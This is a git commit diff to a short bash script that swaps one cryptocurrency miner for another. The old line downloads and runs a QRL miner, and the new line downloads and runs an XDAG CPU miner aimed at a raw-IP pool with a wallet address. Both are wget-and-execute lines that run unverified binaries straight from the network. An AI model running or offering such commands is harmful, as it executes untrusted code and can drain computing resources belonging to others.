fae677ed8a1977a0d66a86d191dd93a053401f00
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-06-13 12:50:03 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-wget https://github.com/BatiKangkung/KangKung/raw/master/rigmac && chmod +x rigmac && ./rigmac --donate-level 1 -o de.qrl.herominers.com:1166 -u Q0105000f663000af2a410ea26f0abc8f8b499d80c85d2fbd9ec894c6f09f006685c27d69cf177b -p CPU -a rx/0 -t 10 -k
+wget https://github.com/dodohua/xdag_mac/releases/download/1.0/CpuMiner && chmod 777 CpuMiner && ./CpuMiner -cpu -p 82.156.18.237:13654 -t 10 -a A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57
